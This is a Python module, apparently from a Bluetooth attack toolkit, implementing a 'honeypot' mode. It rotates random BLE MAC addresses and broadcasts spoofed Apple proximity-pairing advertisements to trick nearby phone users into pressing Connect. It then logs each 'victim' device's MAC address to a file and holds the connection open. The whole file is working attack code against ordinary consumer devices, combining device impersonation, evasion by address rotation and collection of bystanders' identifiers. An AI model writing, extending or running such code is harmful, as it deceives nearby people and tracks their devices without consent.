import os
import time
import struct
import random
import socket
import select
from core.hci_wrapper import start_le_advertising, stop_le_advertising, open_dev, ADV_IND, OGF_LE_CTL, OCF_LE_SET_ADVERTISE_ENABLE
import bluetooth._bluetooth as bluez
from modules.reset import reset_adapter
from rich.panel import Panel

class HoneyPotModule:
    def __init__(self, dev_id=0, console=None):
        self.dev_id = dev_id
        self.sock = None
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def start_honeypot(self):
        self.log(f"[bold red][*] Starting HoneyPot Mode on hci{self.dev_id}...[/bold red]")
        
        reset_adapter(self.dev_id, self.console)
        
        self.sock = open_dev(self.dev_id)
        if not self.sock:
             self.log("[red][!] Failed to open HCI device.[/red]")
             return
        
        old_filter = self.sock.getsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, 14)
        
        type_mask = 1 << bluez.HCI_EVENT_PKT
        event_mask1 = 0xFFFFFFFF
        event_mask2 = 0xFFFFFFFF
        opcode = 0
        
        flt = struct.pack("<IIIH", type_mask, event_mask1, event_mask2, opcode)
        
        try:
            self.sock.setsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, flt)
        except Exception as e:
            self.log(f"[yellow][!] Filter set failed with {e}. Trying with padding (16 bytes)...[/yellow]")
            flt_padded = flt + b'\0\0'
            try:
                self.sock.setsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, flt_padded)
            except Exception as e2:
                self.log(f"[red][!] Failed to set HCI filter: {e2}[/red]")
                return

        self.log("[green][*] Broadcasting Connectable Signal (HoneyPot Active)...[/green]")
        self.log("[dim][*] Waiting for victims to press 'Connect'...[/dim]")

        try:
            while True:
                
                rand_mac = [
                    0xC0 | (random.randint(0, 3) << 4) | random.randint(0, 15),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255)
                ]
                
                rand_mac_bytes = bytes(reversed(rand_mac))
                rand_mac_str = ':'.join('%02x' % x for x in rand_mac)
                
                self.log(f"[dim][*] Rotating MAC Address to: {rand_mac_str}...[/dim]")

                from core.hci_wrapper import set_random_le_address
                try:
                    set_random_le_address(self.sock, rand_mac_bytes)
                except Exception as e:
                    self.log(f"[yellow][!] Failed to set random address: {e}[/yellow]")

                prefix = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
                suffix = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)
                
                left = (random.randint(1, 100),)
                right = (random.randint(1, 100),)
                case = (random.randint(128, 228),)
                packet_data = prefix + left + right + case + suffix

              
                start_le_advertising(self.sock, min_interval=64, max_interval=64, adv_type=ADV_IND, data=packet_data, own_bdaddr_type=0x01)
                
                start_time = time.time()
                connected = False
                
                while (time.time() - start_time) < 5:
                    readable, _, _ = select.select([self.sock], [], [], 0.5) 
                    if self.sock in readable:
                        pkt = self.sock.recv(255)
                        event_code = pkt[1]
                        
                        if event_code == 0x3E and pkt[3] == 0x01:
                            status = pkt[4]
                            handle = struct.unpack("<H", pkt[5:7])[0]
                            peer_bdaddr = pkt[9:15]
                            mac_str = ':'.join('%02x' % b for b in reversed(peer_bdaddr))
                            
                            if status == 0x00:
                                victim_msg = f"[bold red]VICTIM CONNECTED![/bold red]\nMAC: [yellow]{mac_str}[/yellow]\nHandle: {handle}\n[bold green] STATUS: LOCKED ON [/bold green]"
                                if self.console:
                                    self.console.print(Panel(victim_msg, title="HoneyPot Alert", border_style="red"))
                                else:
                                    print(f"\n[!] VICTIM CONNECTED: {mac_str} (LOCKED)")

                                try:
                                    with open("honeypot.log", "a") as f:
                                        import datetime
                                        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                        f.write(f"{timestamp}, {mac_str}, HANDLE={handle}\n")
                                except Exception as e:
                                    self.log(f"[red][!] logging error: {e}[/red]")
                                
                                stop_le_advertising(self.sock)
                                connected = True
                                
                                self.log(f"[bold red][*] Holding Connection with {mac_str} (Ctrl+C to stop)...[/bold red]")
                                
                                try:
                                    while True:
                                        readable, _, _ = select.select([self.sock], [], [], 1)
                                        if self.sock in readable:
                                            pkt = self.sock.recv(255)
                                except KeyboardInterrupt:
                                    raise
                                
                                break 

                        elif event_code == 0x03:
                            status = pkt[3]
                            handle = struct.unpack("<H", pkt[4:6])[0]
                            peer_bdaddr = pkt[6:12]
                            mac_str = ':'.join('%02x' % b for b in reversed(peer_bdaddr))
                            
                            if status == 0x00:
                                victim_msg = f"[bold red]VICTIM CONNECTED (Legacy)![/bold red]\nMAC: [yellow]{mac_str}[/yellow]\nHandle: {handle}\n[bold green] STATUS: LOCKED ON [/bold green]"
                                if self.console:
                                    self.console.print(Panel(victim_msg, title="HoneyPot Alert (0x03)", border_style="red"))
                                else:
                                    print(f"\n[!] VICTIM CONNECTED (Legacy): {mac_str} (LOCKED)")

                                try:
                                    with open("honeypot.log", "a") as f:
                                        import datetime
                                        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                        f.write(f"{timestamp}, {mac_str}, HANDLE={handle}, TYPE=0x03\n")
                                except Exception as e:
                                    self.log(f"[red][!] logging error: {e}[/red]")
                                
                                stop_le_advertising(self.sock)
                                connected = True
                                
                                self.log(f"[bold red][*] Holding Connection with {mac_str} (Ctrl+C to stop)...[/bold red]")
                                
                                try:
                                    while True:
                                        readable, _, _ = select.select([self.sock], [], [], 1)
                                        if self.sock in readable:
                                            pkt = self.sock.recv(255)
                                except KeyboardInterrupt:
                                    raise
                                
                                break 
                    
                if not connected:
                    stop_le_advertising(self.sock)
                    pass
                    
        except KeyboardInterrupt:
            self.log("\n[yellow][*] Stopping HoneyPot...[/yellow]")
            stop_le_advertising(self.sock)
            
            try:
                self.sock.setsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, old_filter)
            except Exception:
                try:
                    self.sock.setsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, old_filter + b'\0\0')
                except Exception as e:
                    self.log(f"[red][!] Failed to restore HCI filter: {e}[/red]")
        except Exception as e:
            self.log(f"[red][!] Error: {e}[/red]")